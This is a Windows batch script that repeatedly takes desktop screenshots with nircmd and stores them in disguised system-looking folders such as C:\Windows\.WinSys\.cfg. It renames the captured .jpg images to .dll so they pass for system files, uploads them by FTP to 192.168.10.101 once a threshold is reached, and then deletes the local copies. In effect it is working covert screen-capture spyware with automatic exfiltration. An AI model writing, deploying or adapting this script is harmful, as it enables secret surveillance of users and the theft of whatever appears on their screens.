@ECHO OFF

set binarypath=C:\Windows\System32\WinSys\binary
REM do remember to change the ftp config file as well, as it need to access the output data.
REM lcd should be aligned with the datapath set here
REM set datapath=C:\Users\Administrator\.WinSys\ftp\.cfg
set datapath=C:\Windows\.WinSys\.cfg
set UPLOAD_FILE_THRES=10
set FORCE_CLEAN_FILE_THRES=10000

if not exist %datapath% mkdir %datapath%

echo "Now switch to data output dir, taken as working dir"
pushd %datapath%

:LOOP

echo "Ener LOOP"
echo "wait..."
REM timeout /T 10 /NOBREAK
ping -n 10 -w 1000 127.0.0.1 >nul

REM C:\Users\Administrator\WinSys\ftp\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot C:\Users\Administrator\WinSys\ftp\cfg\sys~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png
start /wait %binarypath%\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot  "sys~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.jpg"

REM set mmdd=%date:~5,2%%date:~8,2%
REM set hhmiss=%time:~0,2%%time:~3,2%%time:~6,2%
REM set fileprefix=~%mmdd%_%hhmiss%
REM echo "Next image: %fileprefix%.jpg"
REM start /wait %binarypath%\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot "%fileprefix%.jpg"

ping -n 2 -w 1000 127.0.0.1 >nul
ren *.jpg *.dll

set cnt=0
for %%A in (*) do set /a cnt+=1
echo "Total file cnt: %cnt%"

echo "check whether need to force cleanup for massive storage"
if %cnt% GTR %FORCE_CLEAN_FILE_THRES% (
	echo "too many files, force cleanup"
	GOTO CLEANUP
)

if %cnt% GTR %UPLOAD_FILE_THRES% (
	echo "try upload..."
	GOTO UPLOAD
) else (
	echo "wait for more images"
	GOTO LOOP
)
	
:UPLOAD
	ping -n 1 -w 1000 192.168.10.101 >nul
	if %errorlevel%==0 (
		echo "network connected, start upload"
		ftp -s:%binarypath%\config.txt
		if %errorlevel%==0 (
			echo "upload file success"
			GOTO CLEANUP
		) else (
			echo "upload file failed, pending for next cycle"
			GOTO LOOP
		)
	) else (
		echo "network disconnected, skip upload"
		GOTO LOOP
	)

:CLEANUP
	echo "wait before cleanup"
	REM timeout /T 10 /NOBREAK
	ping -n 2 -w 1000 127.0.0.1 >nul
	
	REM should not use "del *" here as it will pause to request user confirmation
	REM could use "del /Q *", for no prompt. but for safety, just hanle it case by case.
	echo "CLEANUP"
	del *.jpg
	del *.png
	del *.dat
	del *.dll
	del *.tmp

GOTO LOOP

popd